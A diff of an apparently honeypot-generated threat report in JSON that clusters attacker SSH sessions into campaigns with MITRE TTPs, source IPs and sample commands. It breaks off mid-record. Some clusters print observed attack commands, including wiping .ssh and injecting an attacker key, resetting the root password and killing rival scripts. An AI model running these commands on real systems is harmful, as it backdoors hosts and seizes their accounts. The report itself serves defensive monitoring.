@@ -1,17 +1,36 @@
 {
-  "generated_at": "2026-10-22T02:18:41.041936+00:00",
-  "total_sessions_with_commands": 2,
-  "total_clusters": 2,
-  "campaign_clusters": 2,
-  "singleton_clusters": 1,
+  "generated_at": "2026-10-22T16:14:51.527173+00:00",
+  "total_sessions_with_commands": 102,
+  "total_clusters": 14,
+  "campaign_clusters": 4,
+  "singleton_clusters": 3,
   "highest_severity": "HIGH",
   "active_campaigns": [
     {
       "cluster_id": "CLU-001",
+      "name": "mdrfckr SSH Key Injection",
+      "severity": "HIGH",
+      "session_count": 1,
+      "unique_ip_count": 1,
+      "ttps": [
+        "T1021.004",
+        "T1078",
+        "T1083",
+        "T1082",
+        "T1592",
+        "T1070",
+        "T1140",
+        "T1547",
+        "T1489",
+        "T1105"
+      ]
+    },
+    {
+      "cluster_id": "CLU-002",
       "name": "Recon Loader Script",
       "severity": "MEDIUM",
-      "session_count": 32,
-      "unique_ip_count": 1,
+      "session_count": 187,
+      "unique_ip_count": 2,
       "ttps": [
         "T1082",
         "T1592",
@@ -20,11 +39,23 @@
       ]
     },
     {
-      "cluster_id": "CLU-002",
+      "cluster_id": "CLU-003",
+      "name": "Mirai/IoT Botnet",
+      "severity": "HIGH",
+      "session_count": 2,
+      "unique_ip_count": 2,
+      "ttps": [
+        "T1082",
+        "T1105",
+        "T1059.004"
+      ]
+    },
+    {
+      "cluster_id": "CLU-006",
       "name": "mdrfckr SSH Key Injection",
       "severity": "HIGH",
-      "session_count": 1,
-      "unique_ip_count": 1,
+      "session_count": 58,
+      "unique_ip_count": 55,
       "ttps": [
         "T1021.004",
         "T1078",
@@ -37,6 +68,97 @@
   "clusters": [
     {
       "cluster_id": "CLU-001",
+      "is_campaign": true,
+      "campaign_name": "mdrfckr SSH Key Injection",
+      "campaign_severity": "HIGH",
+      "campaign_description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
+      "matched_campaigns": [
+        {
+          "name": "mdrfckr SSH Key Injection",
+          "ttps": [
+            "T1021.004",
+            "T1078",
+            "T1105"
+          ],
+          "severity": "HIGH",
+          "description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
+          "pattern_hits": 3,
+          "pattern_total": 3
+        }
+      ],
+      "session_count": 1,
+      "unique_ips": [
+        "103.255.200.90"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "23475c21cb9246a9",
+      "ttps": [
+        {
+          "id": "T1021.004",
+          "name": "Remote Services: SSH"
+        },
+        {
+          "id": "T1078",
+          "name": "Valid Accounts"
+        },
+        {
+          "id": "T1083",
+          "name": "File & Directory Discovery"
+        },
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        },
+        {
+          "id": "T1592",
+          "name": "Gather Victim Host Info"
+        },
+        {
+          "id": "T1070",
+          "name": "Indicator Removal"
+        },
+        {
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files"
+        },
+        {
+          "id": "T1547",
+          "name": "Boot/Logon Autostart"
+        },
+        {
+          "id": "T1489",
+          "name": "Service Stop"
+        },
+        {
+          "id": "T1105",
+          "name": "T1105"
+        }
+      ],
+      "representative_commands": [
+        "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+        "cat /proc/cpuinfo | grep name | wc -l",
+        "echo \"root:p2g4DV7gXaFA\"|chpasswd|bash",
+        "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
+        "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
+        "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+        "ls -lh $(which ls)",
+        "which ls",
+        "crontab -l"
+      ],
+      "members": [
+        {
+          "session_id": "IR-4826bfd321f7",
+          "src_ip": "103.255.200.90",
+          "country": "CN",
+          "isp": "Bei Jing Cloud Times Technology Co.,Ltd",
+          "command_count": 19,
+          "timestamp": "2026-10-22T12:20:33.963833Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-002",
       "is_campaign": true,
       "campaign_name": "Recon Loader Script",
       "campaign_severity": "MEDIUM",
@@ -67,11 +189,12 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 32,
+      "session_count": 187,
       "unique_ips": [
+        "2.57.122.74",
         "195.178.110.228"
       ],
-      "unique_ip_count": 1,
+      "unique_ip_count": 2,
       "sequence_hash": "4ed226bcbb7ec342",
       "ttps": [
         {
@@ -110,12 +233,161 @@
           "country": "NL",
           "isp": "TECHOFF SRV LIMITED",
           "command_count": 10,
-          "timestamp": "2026-10-22T00:01:32.168174Z"
+          "timestamp": "2026-10-22T00:56:28.830629Z"
+        },
+        {
+          "session_id": "IR-732602561fe2",
+          "src_ip": "2.57.122.74",
+          "country": "RO",
+          "isp": "TECHOFF SRV LIMITED",
+          "command_count": 10,
+          "timestamp": "2026-10-22T11:22:00.190243Z"
+        },
+        {
+          "session_id": "IR-290f0d2ff6d3",
+          "src_ip": "2.57.122.74",
+          "country": "RO",
+          "isp": "TECHOFF SRV LIMITED",
+          "command_count": 10,
+          "timestamp": "2026-10-22T12:00:54.914030Z"
+        },
+        {
+          "session_id": "IR-0fa2425f2553",
+          "src_ip": "2.57.122.74",
+          "country": "RO",
+          "isp": "TECHOFF SRV LIMITED",
+          "command_count": 10,
+          "timestamp": "2026-10-22T14:00:52.090017Z"
         }
       ]
     },
     {
-      "cluster_id": "CLU-002",
+      "cluster_id": "CLU-003",
+      "is_campaign": true,
+      "campaign_name": "Mirai/IoT Botnet",
+      "campaign_severity": "HIGH",
+      "campaign_description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
+      "matched_campaigns": [
+        {
+          "name": "Mirai/IoT Botnet",
+          "ttps": [
+            "T1105",
+            "T1059.004"
+          ],
+          "severity": "HIGH",
+          "description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
+          "pattern_hits": 2,
+          "pattern_total": 3
+        }
+      ],
+      "session_count": 2,
+      "unique_ips": [
+        "176.65.132.132",
+        "94.154.43.196"
+      ],
+      "unique_ip_count": 2,
+      "sequence_hash": "247e5eacc7fee14d",
+      "ttps": [
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        },
+        {
+          "id": "T1105",
+          "name": "T1105"
+        },
+        {
+          "id": "T1059.004",
+          "name": "T1059.004"
+        }
+      ],
+      "representative_commands": [
+        "echo SHELL_TEST",
+        "/bin/busybox TEST",
+        "cat /proc",
+        "./"
+      ],
+      "members": [
+        {
+          "session_id": "IR-b9e8dd432a07",
+          "src_ip": "94.154.43.196",
+          "country": "NL",
+          "isp": "",
+          "command_count": 4,
+          "timestamp": "2026-10-22T01:10:11.271655Z"
+        },
+        {
+          "session_id": "IR-0c7306c24749",
+          "src_ip": "176.65.132.132",
+          "country": "NL",
+          "isp": "TechTies Inc.",
+          "command_count": 4,
+          "timestamp": "2026-10-22T14:20:13.291060Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-004",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "74.82.47.5"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "c97a0dfae26ffcda",
+      "ttps": [],
+      "representative_commands": [
+        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
+        "Accept: */*",
+        "Accept-Encoding: gzip"
+      ],
+      "members": [
+        {
+          "session_id": "IR-b9f05a18414c",
+          "src_ip": "74.82.47.5",
+          "country": "US",
+          "isp": "The Shadowserver Foundation, Inc.",
+          "command_count": 3,
+          "timestamp": "2026-10-22T04:51:40.600624Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-005",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "172.236.228.229"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "0084449e5825fe2e",
+      "ttps": [],
+      "representative_commands": [
+        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
+        "Accept: */*",
+        "Accept-Encoding: gzip"
+      ],
+      "members": [
+        {
+          "session_id": "IR-c8b7d559792b",
+          "src_ip": "172.236.228.229",
+          "country": "US",
+          "isp": "Linode",
+          "command_count": 3,
+          "timestamp": "2026-10-22T10:36:23.933368Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-006",
       "is_campaign": true,
       "campaign_name": "mdrfckr SSH Key Injection",
       "campaign_severity": "HIGH",
@@ -134,11 +406,65 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 1,
+      "session_count": 58,
       "unique_ips": [
-        "20.184.59.236"
+        "103.177.111.164",
+        "154.206.89.53",
+        "97.93.43.157",
+        "203.113.105.99",
+        "220.118.173.234",
+        "103.155.47.50",
+        "102.88.137.213",
+        "154.116.254.157",
+        "150.136.214.177",
+        "197.44.229.34",
+        "145.239.78.180",
+        "92.27.101.99",
+        "187.110.238.50",
+        "38.22.170.10",
+        "62.169.17.3",
+        "114.130.85.36",
+        "187.141.71.166",
+        "107.150.105.10",
+        "185.158.22.150",
+        "35.221.138.107",
+        "191.37.76.156",
+        "64.99.117.209",
+        "145.239.89.124",
+        "112.151.168.124",
+        "118.145.99.207",
+        "101.79.165.43",
+        "201.63.223.138",
+        "43.128.3.201",
+        "203.128.6.159",
+        "62.193.91.121",
+        "92.30.243.69",
+        "187.154.96.215",
+        "186.209.77.237",
+        "104.244.74.84",
+        "195.178.191.5",
+        "78.135.111.47",
+        "188.152.238.126",
+        "94.184.10.185",
+        "118.194.251.197",
+        "211.106.133.202",
+        "192.9.228.120",
+        "20.102.98.53",
+        "103.172.236.241",
+        "103.154.63.62",
+        "43.173.68.211",
+        "65.181.71.117",
+        "112.216.120.67",
+        "103.86.198.162",
+        "212.87.221.213",
+        "134.209.235.214",
+        "182.73.176.186",
+        "116.255.227.108",
+        "59.15.58.148",
+        "124.174.22.26",
+        "103.241.43.193"
       ],
-      "unique_ip_count": 1,
+      "unique_ip_count": 55,
       "sequence_hash": "98af0db988d5971c",
       "ttps": [
         {
@@ -168,12 +494,951 @@
       ],
       "members": [
         {
-          "session_id": "IR-f19e401e35e3",
-          "src_ip": "20.184.59.236",
-          "country": "SG",
+          "session_id": "IR-cfc9f3326bb4",
+          "src_ip": "94.184.10.185",
+          "country": "IR",
+          "isp": "Institute for Research in Fundamental Sciences",
+          "command_count": 2,
+          "timestamp": "2026-10-22T00:57:06.297437Z"
+        },
+        {
+          "session_id": "IR-d91ecf82ed47",
+          "src_ip": "185.158.22.150",
+          "country": "IQ",
+          "isp": "Trade Link Logistics General Trading & Contracting Company W.L.L., L.L.C.",
+          "command_count": 2,
+          "timestamp": "2026-10-22T00:57:33.875377Z"
+        },
+        {
+          "session_id": "IR-6ddf4751c485",
+          "src_ip": "145.239.89.124",
+          "country": "PL",
+          "isp": "OVH VPS WAW",
+          "command_count": 2,
+          "timestamp": "2026-10-22T01:02:55.108328Z"
+        },
+        {
+          "session_id": "IR-82413c547278",
+          "src_ip": "201.63.223.138",
+          "country": "BR",
+          "isp": "TELEF\u00d4NICA BRASIL S.A",
+          "command_count": 2,
+          "timestamp": "2026-10-22T01:03:55.625260Z"
+        },
+        {
+          "session_id": "IR-1556432a448d",
+          "src_ip": "134.209.235.214",
+          "country": "DE",
+          "isp": "DigitalOcean, LLC",
+          "command_count": 2,
+          "timestamp": "2026-10-22T01:27:31.756248Z"
+        },
+        {
+          "session_id": "IR-b95cd76d26bd",
+          "src_ip": "191.37.76.156",
+          "country": "BR",
+          "isp": "CNT Fiber",
+          "command_count": 2,
+          "timestamp": "2026-10-22T01:29:19.444876Z"
+        },
+        {
+          "session_id": "IR-cb1aca472b35",
+          "src_ip": "92.27.101.99",
+          "country": "GB",
+          "isp": "TalkTalk Communications Limited",
+          "command_count": 2,
+          "timestamp": "2026-10-22T01:30:12.776279Z"
+        },
+        {
+          "session_id": "IR-623e6a93237a",
+          "src_ip": "92.30.243.69",
+          "country": "GB",
+          "isp": "TalkTalk Communications Limited",
+          "command_count": 2,
+          "timestamp": "2026-10-22T01:30:32.307299Z"
+        },
+        {
+          "session_id": "IR-0a73f1e2327c",
+          "src_ip": "116.255.227.108",
+          "country": "CN",
+          "isp": "Zhengzhou Gainet Computer Network Technology Co.,Ltd.",
+          "command_count": 2,
+          "timestamp": "2026-10-22T01:46:36.906958Z"
+        },
+        {
+          "session_id": "IR-e40e267bab3b",
+          "src_ip": "78.135.111.47",
+          "country": "TR",
+          "isp": "YIGIT HOSTING BILISIM E-TICARET GIDA SAN. TIC. LTD. STI.",
+          "command_count": 2,
+          "timestamp": "2026-10-22T02:37:59.954149Z"
+        },
+        {
+          "session_id": "IR-ea0283bd18b3",
+          "src_ip": "203.113.105.99",
+          "country": "TH",
+          "isp": "TOT Public Company Limited Bangkok",
+          "command_count": 2,
+          "timestamp": "2026-10-22T02:40:22.005180Z"
+        },
+        {
+          "session_id": "IR-7d8afb0612fd",
+          "src_ip": "62.193.91.121",
+          "country": "EG",
+          "isp": "Nile Online",
+          "command_count": 2,
+          "timestamp": "2026-10-22T02:40:58.313913Z"
+        },
+        {
+          "session_id": "IR-226b8cda8b71",
+          "src_ip": "154.206.89.53",
+          "country": "US",
+          "isp": "Kaopu Cloud HK Limited",
+          "command_count": 2,
+          "timestamp": "2026-10-22T03:59:34.713627Z"
+        },
+        {
+          "session_id": "IR-7664328364c6",
+          "src_ip": "59.15.58.148",
+          "country": "KR",
+          "isp": "Korea Telecom",
+          "command_count": 2,
+          "timestamp": "2026-10-22T04:04:00.138127Z"
+        },
+        {
+          "session_id": "IR-998ac275c6c9",
+          "src_ip": "103.177.111.164",
+          "country": "VN",
+          "isp": "ADNS CO., LTD",
+          "command_count": 2,
+          "timestamp": "2026-10-22T04:04:38.981970Z"
+        },
+        {
+          "session_id": "IR-2724101e33c8",
+          "src_ip": "124.174.22.26",
+          "country": "CN",
+          "isp": "Beijing Volcano Engine Technology Co., Ltd.",
+          "command_count": 2,
+          "timestamp": "2026-10-22T04:14:49.345196Z"
+        },
+        {
+          "session_id": "IR-0532bf8adaf8",
+          "src_ip": "118.194.251.197",
+          "country": "TH",
+          "isp": "UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED",
+          "command_count": 2,
+          "timestamp": "2026-10-22T04:39:56.681067Z"
+        },
+        {
+          "session_id": "IR-a1f9ebec702f",
+          "src_ip": "107.150.105.10",
+          "country": "US",
+          "isp": "UCLOUD",
+          "command_count": 2,
+          "timestamp": "2026-10-22T04:56:50.417473Z"
+        },
+        {
+          "session_id": "IR-6076f9416dd9",
+          "src_ip": "43.128.3.201",
+          "country": "HK",
+          "isp": "Asia Pacific Network Information Center, Pty. Ltd.",
+          "command_count": 2,
+          "timestamp": "2026-10-22T04:56:58.332350Z"
+        },
+        {
+          "session_id": "IR-cebae9dca7d0",
+          "src_ip": "38.22.170.10",
+          "country": "MX",
+          "isp": "FIBERWIFI SA DE CV",
+          "command_count": 2,
+          "timestamp": "2026-10-22T04:59:37.353499Z"
+        },
+        {
+          "session_id": "IR-db3a97f9cb9f",
+          "src_ip": "103.241.43.193",
+          "country": "VN",
+          "isp": "MMO VIET NAM SOFTWARE COMPANY LIMITED",
+          "command_count": 2,
+          "timestamp": "2026-10-22T05:00:19.347912Z"
+        },
+        {
+          "session_id": "IR-739277f8ac45",
+          "src_ip": "220.118.173.234",
+          "country": "KR",
+          "isp": "Korea Telecom",
+          "command_count": 2,
+          "timestamp": "2026-10-22T05:20:42.642891Z"
+        },
+        {
+          "session_id": "IR-111b5bfddc58",
+          "src_ip": "187.110.238.50",
+          "country": "BR",
+          "isp": "DB3 SERVICOS DE TELECOMUNICACOES S.A",
+          "command_count": 2,
+          "timestamp": "2026-10-22T05:21:17.219809Z"
+        },
+        {
+          "session_id": "IR-670f014bb620",
+          "src_ip": "211.106.133.202",
+          "country": "KR",
+          "isp": "Korea Telecom",
+          "command_count": 2,
+          "timestamp": "2026-10-22T06:27:51.983291Z"
+        },
+        {
+          "session_id": "IR-a66440185197",
+          "src_ip": "101.79.165.43",
+          "country": "HK",
+          "isp": "CDNetworks",
+          "command_count": 2,
+          "timestamp": "2026-10-22T06:28:20.379367Z"
+        },
+        {
+          "session_id": "IR-6a922090ca24",
+          "src_ip": "114.130.85.36",
+          "country": "BD",
+          "isp": "Mango Teleservices, IIG of Bangladesh",
+          "command_count": 2,
+          "timestamp": "2026-10-22T06:34:31.264436Z"
+        },
+        {
+          "session_id": "IR-ff415e10c0ce",
+          "src_ip": "65.181.71.117",
+          "country": "HK",
+          "isp": "PCCW IMS Ltd (PCCW Business Internet Access)",
+          "command_count": 2,
+          "timestamp": "2026-10-22T06:37:58.905316Z"
+        },
+        {
+          "session_id": "IR-83db5cae7ee8",
+          "src_ip": "186.209.77.237",
+          "country": "BR",
+          "isp": "Desktop Sigmanet Comunica\u00e7\u00e3o Multim\u00eddia SA",
+          "command_count": 2,
+          "timestamp": "2026-10-22T06:39:50.978396Z"
+        },
+        {
+          "session_id": "IR-c12d3a02f928",
+          "src_ip": "188.152.238.126",
+          "country": "IT",
+          "isp": "Vodafone Italia S.p.A.",
+          "command_count": 2,
+          "timestamp": "2026-10-22T07:45:01.350419Z"
+        },
+        {
+          "session_id": "IR-0fd2809d6655",
+          "src_ip": "112.151.168.124",
+          "country": "KR",
+          "isp": "LG POWERCOMM",
+          "command_count": 2,
+          "timestamp": "2026-10-22T07:49:05.897796Z"
+        },
+        {
+          "session_id": "IR-0cd9b99920b4",
+          "src_ip": "195.178.191.5",
+          "country": "SE",
+          "isp": "Bahnhof AB",
+          "command_count": 2,
+          "timestamp": "2026-10-22T08:50:10.896877Z"
+        },
+        {
+          "session_id": "IR-e10930bb85e7",
+          "src_ip": "182.73.176.186",
+          "country": "IN",
+          "isp": "CHETTINAD ACADEMY OF RESE",
+          "command_count": 2,
+          "timestamp": "2026-10-22T08:50:14.642251Z"
+        },
+        {
+          "session_id": "IR-b10aaf765033",
+          "src_ip": "187.141.71.166",
+          "country": "MX",
+          "isp": "Uninet S.A. de C.V.",
+          "command_count": 2,
+          "timestamp": "2026-10-22T08:52:19.108910Z"
+        },
+        {
+          "session_id": "IR-754ff39a1a14",
+          "src_ip": "145.239.78.180",
+          "country": "FR",
+          "isp": "OVH SAS",
+          "command_count": 2,
+          "timestamp": "2026-10-22T08:52:21.051763Z"
+        },
+        {
+          "session_id": "IR-b8408d2ef1c2",
+          "src_ip": "192.9.228.120",
+          "country": "US",
+          "isp": "Oracle Corporation",
+          "command_count": 2,
+          "timestamp": "2026-10-22T08:52:45.870423Z"
+        },
+        {
+          "session_id": "IR-0d245e3eb167",
+          "src_ip": "187.154.96.215",
+          "country": "MX",
+          "isp": "Uninet S.A. de C.V.",
+          "command_count": 2,
+          "timestamp": "2026-10-22T08:54:42.006464Z"
+        },
+        {
+          "session_id": "IR-b5c35bec2591",
+          "src_ip": "35.221.138.107",
+          "country": "TW",
+          "isp": "Google LLC",
+          "command_count": 2,
+          "timestamp": "2026-10-22T08:54:42.619082Z"
+        },
+        {
+          "session_id": "IR-1e0bbb998ddd",
+          "src_ip": "97.93.43.157",
+          "country": "US",
+          "isp": "Charter Communications LLC",
+          "command_count": 2,
+          "timestamp": "2026-10-22T08:55:36.522091Z"
+        },
+        {
+          "session_id": "IR-6719bea5668b",
+          "src_ip": "154.116.254.157",
+          "country": "AO",
+          "isp": "INFOSI Datacenter",
+          "command_count": 2,
+          "timestamp": "2026-10-22T08:55:46.025518Z"
+        },
+        {
+          "session_id": "IR-28dfa6902eb8",
+          "src_ip": "64.99.117.209",
+          "country": "US",
+          "isp": "Ting Fiber Inc.",
+          "command_count": 2,
+          "timestamp": "2026-10-22T09:00:25.961416Z"
+        },
+        {
+          "session_id": "IR-05a0fe48e7d7",
+          "src_ip": "197.44.229.34",
+          "country": "EG",
+          "isp": "TE Data",
+          "command_count": 2,
+          "timestamp": "2026-10-22T09:00:29.626168Z"
+        },
+        {
+          "session_id": "IR-d5a391126e0a",
+          "src_ip": "103.86.198.162",
+          "country": "BD",
+          "isp": "Maisha BD NET",
+          "command_count": 2,
+          "timestamp": "2026-10-22T09:01:54.938279Z"
+        },
+        {
+          "session_id": "IR-738a206465f1",
+          "src_ip": "112.216.120.67",
+          "country": "KR",
+          "isp": "LG Uplus",
+          "command_count": 2,
+          "timestamp": "2026-10-22T09:02:14.765536Z"
+        },
+        {
+          "session_id": "IR-9c7fe9cf7526",
+          "src_ip": "118.145.99.207",
+          "country": "CN",
+          "isp": "Beijing Volcano Engine Technology Co., Ltd.",
+          "command_count": 2,
+          "timestamp": "2026-10-22T09:51:53.684020Z"
+        },
+        {
+          "session_id": "IR-1c6d36828e84",
+          "src_ip": "20.102.98.53",
+          "country": "US",
           "isp": "Microsoft Corporation",
           "command_count": 2,
-          "timestamp": "2026-10-22T00:43:43.716464Z"
+          "timestamp": "2026-10-22T10:21:29.771829Z"
+        },
+        {
+          "session_id": "IR-82f7ae68695e",
+          "src_ip": "203.128.6.159",
+          "country": "PK",
+          "isp": "Brain Telecommunication Ltd.",
+          "command_count": 2,
+          "timestamp": "2026-10-22T10:25:24.862795Z"
+        },
+        {
+          "session_id": "IR-68e3126e8fe5",
+          "src_ip": "145.239.89.124",
+          "country": "PL",
+          "isp": "OVH VPS WAW",
+          "command_count": 2,
+          "timestamp": "2026-10-22T10:45:20.342269Z"
+        },
+        {
+          "session_id": "IR-ffc79dd1e3dc",
+          "src_ip": "102.88.137.213",
+          "country": "NG",
+          "isp": "MTN Nigeria",
+          "command_count": 2,
+          "timestamp": "2026-10-22T10:47:08.089513Z"
+        },
+        {
+          "session_id": "IR-785ffbd87e49",
+          "src_ip": "43.173.68.211",
+          "country": "US",
+          "isp": "ACEVILLE PTE.LTD.",
+          "command_count": 2,
+          "timestamp": "2026-10-22T12:20:32.702587Z"
+        },
+        {
+          "session_id": "IR-e054699fd182",
+          "src_ip": "154.116.254.157",
+          "country": "AO",
+          "isp": "INFOSI Datacenter",
+          "command_count": 2,
+          "timestamp": "2026-10-22T12:21:42.644441Z"
+        },
+        {
+          "session_id": "IR-0eb968e89fdf",
+          "src_ip": "103.172.236.241",
+          "country": "VN",
+          "isp": "HERAL SCIENCE AND TECHNOLOGY JOINT STOCK COMPANY",
+          "command_count": 2,
+          "timestamp": "2026-10-22T12:24:25.246154Z"
+        },
+        {
+          "session_id": "IR-95d8df2dc405",
+          "src_ip": "104.244.74.84",
+          "country": "CH",
+          "isp": "BuyVM",
+          "command_count": 2,
+          "timestamp": "2026-10-22T13:00:45.586806Z"
+        },
+        {
+          "session_id": "IR-cbe99d89168c",
+          "src_ip": "62.169.17.3",
+          "country": "FR",
+          "isp": "Contabo GmbH",
+          "command_count": 2,
+          "timestamp": "2026-10-22T13:50:11.516660Z"
+        },
+        {
+          "session_id": "IR-4d0f0e398fa9",
+          "src_ip": "212.87.221.213",
+          "country": "TR",
+          "isp": "Neterra Ltd.",
+          "command_count": 2,
+          "timestamp": "2026-10-22T14:03:38.916321Z"
+        },
+        {
+          "session_id": "IR-1c5d4d746471",
+          "src_ip": "103.155.47.50",
+          "country": "ID",
+          "isp": "PT Profesional Internet Indonesia",
+          "command_count": 2,
+          "timestamp": "2026-10-22T14:06:37.365448Z"
+        },
+        {
+          "session_id": "IR-3dcf4173fc2a",
+          "src_ip": "145.239.89.124",
+          "country": "PL",
+          "isp": "OVH VPS WAW",
+          "command_count": 2,
+          "timestamp": "2026-10-22T14:09:30.852472Z"
+        },
+        {
+          "session_id": "IR-e909b816efbd",
+          "src_ip": "150.136.214.177",
+          "country": "US",
+          "isp": "Oracle Public Cloud",
+          "command_count": 2,
+          "timestamp": "2026-10-22T14:20:09.060261Z"
+        },
+        {
+          "session_id": "IR-d4e497591253",
+          "src_ip": "103.154.63.62",
+          "country": "VN",
+          "isp": "SUNCLOUD TECHNOLOGY INFRASTRUCTURE JOINT STOCK COMPANY",
+          "command_count": 2,
+          "timestamp": "2026-10-22T14:26:14.937558Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-007",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 3,
+      "unique_ips": [
+        "104.199.79.62",
+        "35.195.24.58",
+        "34.79.51.154"
+      ],
+      "unique_ip_count": 3,
+      "sequence_hash": "6c2b02475f4c7e7e",
+      "ttps": [],
+      "representative_commands": [
+        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
+        "Accept-Encoding: gzip"
+      ],
+      "members": [
+        {
+          "session_id": "IR-3db3ecc305aa",
+          "src_ip": "35.195.24.58",
+          "country": "BE",
+          "isp": "Google LLC",
+          "command_count": 2,
+          "timestamp": "2026-10-22T03:51:23.671788Z"
+        },
+        {
+          "session_id": "IR-3a88687b3135",
+          "src_ip": "34.79.51.154",
+          "country": "BE",
+          "isp": "Google LLC",
+          "command_count": 2,
+          "timestamp": "2026-10-22T04:16:41.749721Z"
+        },
+        {
+          "session_id": "IR-e7758ce905a0",
+          "src_ip": "104.199.79.62",
+          "country": "BE",
+          "isp": "Google LLC",
+          "command_count": 2,
+          "timestamp": "2026-10-22T04:58:29.112200Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-008",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 200,
+      "unique_ips": [
+        "45.148.10.61",
+        "179.43.153.2",
+        "2.57.122.238"
+      ],
+      "unique_ip_count": 3,
+      "sequence_hash": "876deb10d4cf5b5c",
+      "ttps": [
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        }
+      ],
+      "representative_commands": [
+        "/bin/./uname -s -v -n -r -m"
+      ],
+      "members": [
+        {
+          "session_id": "IR-f050e4e95a1a",
+          "src_ip": "45.148.10.61",
+          "country": "NL",
+          "isp": "TECHOFF SRV LIMITED",
+          "command_count": 1,
+          "timestamp": "2026-10-22T01:13:16.529147Z"
+        },
+        {
+          "session_id": "IR-eee25e56a641",
+          "src_ip": "2.57.122.238",
+          "country": "RO",
+          "isp": "TECHOFF SRV LIMITED",
+          "command_count": 1,
+          "timestamp": "2026-10-22T01:25:20.147043Z"
+        },
+        {
+          "session_id": "IR-04f0a4dcc702",
+          "src_ip": "2.57.122.238",
+          "country": "RO",
+          "isp": "TECHOFF SRV LIMITED",
+          "command_count": 1,
+          "timestamp": "2026-10-22T02:01:18.819458Z"
+        },
+        {
+          "session_id": "IR-814a954aff81",
+          "src_ip": "179.43.153.2",
+          "country": "PA",
+          "isp": "PRIVATE LAYER INC",
+          "command_count": 1,
+          "timestamp": "2026-10-22T04:23:16.080560Z"
+        },
+        {
+          "session_id": "IR-c339b9aa2d8f",
+          "src_ip": "179.43.153.2",
+          "country": "PA",
+          "isp": "PRIVATE LAYER INC",
+          "command_count": 1,
+          "timestamp": "2026-10-22T06:01:03.284307Z"
+        },
+        {
+          "session_id": "IR-32bcb88be0a8",
+          "src_ip": "179.43.153.2",
+          "country": "PA",
+          "isp": "PRIVATE LAYER INC",
+          "command_count": 1,
+          "timestamp": "2026-10-22T08:00:49.022984Z"
+        },
+        {
+          "session_id": "IR-92ae15b4b342",
+          "src_ip": "179.43.153.2",
+          "country": "PA",
+          "isp": "PRIVATE LAYER INC",
+          "command_count": 1,
+          "timestamp": "2026-10-22T10:02:08.441273Z"
+        },
+        {
+          "session_id": "IR-83228a3c9639",
+          "src_ip": "45.148.10.61",
+          "country": "NL",
+          "isp": "TECHOFF SRV LIMITED",
+          "command_count": 1,
+          "timestamp": "2026-10-22T10:55:16.194537Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-009",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 6,
+      "unique_ips": [
+        "43.100.80.234",
+        "218.60.77.234",
+        "142.252.103.21",
+        "218.27.202.178",
+        "120.48.53.174",
+        "169.58.33.158"
+      ],
+      "unique_ip_count": 6,
+      "sequence_hash": "6fa4c8ac58e7a1d9",
+      "ttps": [
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        }
+      ],
+      "representative_commands": [
+        "uname -s -m"
+      ],
+      "members": [
+        {
+          "session_id": "IR-90fcf6b9fd03",
+          "src_ip": "218.60.77.234",
